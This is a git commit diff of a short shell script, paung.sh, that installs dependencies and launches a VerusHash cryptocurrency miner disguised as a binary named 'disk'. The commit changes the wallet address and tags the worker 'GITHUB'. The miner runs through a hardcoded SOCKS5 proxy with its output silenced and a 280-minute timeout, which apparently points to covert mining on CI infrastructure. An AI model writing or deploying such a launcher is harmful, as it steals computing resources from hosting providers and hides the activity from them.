a159f6f3e03e963ce1a1a7848b38d8a6b5ddb497
MarpaungNgat <88931827+MarpaungNgat@users.noreply.github.com>
2021-08-14 18:48:18 +0700

    Update and rename right.sh to paung.sh

--- paung.sh
+++ paung.sh
@@ -4,8 +4,8 @@ sudo apt install screen libjansson4 -y
 chmod +x disk
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
-WALLET=DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr
+WALLET=19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-PRANKENSTAINT)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GITHUB)
 timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
